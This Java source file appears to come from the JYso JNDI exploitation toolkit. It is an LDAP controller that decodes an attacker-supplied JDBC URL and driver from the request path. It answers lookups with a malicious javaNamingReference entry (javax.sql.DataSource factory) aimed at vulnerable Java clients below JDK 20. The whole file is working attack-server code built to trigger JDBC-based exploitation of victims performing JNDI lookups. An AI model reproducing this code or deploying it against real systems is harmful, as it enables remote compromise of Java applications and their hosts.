package com.qi4l.JYso.controllers;

import com.qi4l.JYso.enumtypes.GadgetType;
import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.utils.Utils;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.fusesource.jansi.Ansi;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

@SuppressWarnings("unused")
@LdapMapping(uri = {"/jdbc1"})
public class jdbcController1 extends BaseLdapController {

    private static final Logger log = LogManager.getLogger(jdbcController1.class);
    private static String driverq;
    private static String factoryType;
    private static String[] params;
    private static GadgetType gadgetType;

    public static void printResultJDBC1(String base) throws Exception {
        base = base.replace('\\', '/');

        driverq = segment(base, 1);
        if (driverq.isEmpty()) {
            throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base);
        }
        System.out.println(Ansi.ansi().fgBrightMagenta().a("  driver: " + driverq).reset());

        factoryType = segment(base, 2);
        System.out.println(Ansi.ansi().fgBrightBlue().a("  Factory: " + factoryType).reset());

        String gadgetStr = segment(base, 3);
        if (!gadgetStr.isEmpty()) {
            try {
                gadgetType = GadgetType.valueOf(gadgetStr.toLowerCase());
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + gadgetStr);
            }
        }

        if (gadgetType == GadgetType.base64) {
            String cmd = Utils.getCmdFromBase(base);
            System.out.println(Ansi.ansi().fgBrightRed().a("  JDBC_URL: " + cmd).reset());
            params = new String[]{cmd};
        }
    }

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        try {
            Entry e = new Entry(base);
            String driver = driverq;
            String JDBC_URL = params[0];

            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaClassName", "javax.sql.DataSource");
            e.addAttribute("javaFactory", factoryType);
            e.addAttribute("javaReferenceAddress", "/0/url/" + JDBC_URL, "/1/driverClassName/" + driver, "/2/username/Squirt1e", "/3/password/Squirt1e", "/4/initialSize/1");

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Exception er) {
            System.err.println("Error while generating or serializing payload");
            log.error("Error while generating or serializing payload", er);
        }
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        System.out.println("- JNDI JDBC Reference Links Target < JDK20");
        try {
            printResultJDBC1(base);
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }
}
